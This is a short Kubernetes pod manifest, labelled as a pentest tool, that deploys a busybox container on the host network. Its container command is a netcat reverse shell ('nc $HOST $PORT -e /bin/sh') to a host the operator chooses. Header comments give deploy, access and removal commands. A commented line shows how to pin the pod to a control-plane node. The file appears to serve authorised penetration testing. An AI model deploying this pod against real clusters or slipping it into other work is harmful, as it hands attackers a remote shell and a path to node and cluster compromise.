###########################################################
## Deploy: kubectl -n [namespace] apply -f hostnetwork-revshell-pod.yaml 
## Access: kubectl -n [namespace] exec -it hostnetwork-revshell-pod -- chroot /host
## Remove: kubectl -n [namespace] delete hostnetwork-revshell-pod
###########################################################
apiVersion: v1
kind: Pod
metadata:
  name: hostnetwork-revshell-pod
  labels:
    app: pentest
spec:
  hostNetwork: true
  containers:
  - name: hostnetwork-pod
    image: busybox
    command: [ "/bin/sh", "-c", "--" ]
    args: [ "nc $HOST $PORT  -e /bin/sh;" ]
  #nodeName: k8s-control-plane-node # Force your pod to run on the control-plane node by uncommenting this line and changing to a control-plane node name
  
